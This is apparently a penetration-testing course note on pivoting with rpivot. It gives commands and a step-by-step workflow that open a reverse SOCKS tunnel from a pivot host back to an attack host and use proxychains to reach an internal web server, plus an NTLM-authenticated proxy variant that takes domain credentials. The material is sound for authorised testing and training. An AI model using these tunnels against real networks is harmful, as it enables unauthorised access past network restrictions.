# NOTE — Web Server Pivoting with Rpivot

## ID
610

## Module
Pivoting, Tunneling, and Port Forwarding

## Kind
notes

## Title
Section 11 — Web Server Pivoting with Rpivot

## Description
Use rpivot (a reverse SOCKS proxy written in Python 2) to access an internal web server through a pivot host when inbound connections to the pivot are restricted but outbound connections are allowed.

## Tags
rpivot, socks-proxy, reverse-proxy, pivoting, python2

## Commands
- `git clone https://github.com/klsecservices/rpivot.git`
- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
- `python2.7 client.py --server-ip <ATTACK_HOST_TUN0_IP> --server-port 9999`
- `pkill firefox-esr`
- `proxychains firefox-esr http://172.16.5.135`
- `proxychains curl http://172.16.5.135`
- `python client.py --server-ip <WEBSERVER_IP> --server-port 8080 --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 --domain <DOMAIN> --username <USER> --password <PASS>`

## What This Section Covers
Rpivot creates a reverse SOCKS tunnel: the client (on the pivot host) connects out to the server (on your attack host). This is useful when the pivot host cannot accept inbound connections but can reach your attack host (e.g., through a VPN or outbound HTTPS). Once the tunnel is established, you can use proxychains on your attack host to browse or access internal web servers (e.g., `172.16.5.135:80`) through the pivot. The note also covers an NTLM‑authenticated proxy variant and troubleshooting tips.

## Methodology
1. **Clone rpivot** on your attack host.
2. **Transfer the rpivot folder** to the pivot host (e.g., via `scp`).
3. **Start the server** on the attack host:  
   `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
4. **Start the client** on the pivot host:  
   `python2.7 client.py --server-ip <attack_host_tun0_ip> --server-port 9999`
5. **Configure proxychains** to use `socks4 127.0.0.1 9050`.
6. **Kill existing Firefox instances** (if any), then launch Firefox (or curl) through proxychains to access internal web servers.

## Multi-step Workflow
```bash
# On attack host
git clone https://github.com/klsecservices/rpivot.git
scp -r rpivot ubuntu@<pivot_ip>:/home/ubuntu/
cd rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# On pivot host (SSH session)
cd ~/rpivot
python2.7 client.py --server-ip 10.10.15.x --server-port 9999

# On attack host (another terminal)
pkill firefox-esr
proxychains firefox-esr http://172.16.5.135
# Or curl
proxychains curl http://172.16.5.135

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|pivoting-tunneling]]  
← [[10-sshuttle]] | [[13-ptunnel-icmp]] →
<!-- AUTO-LINKS-END -->
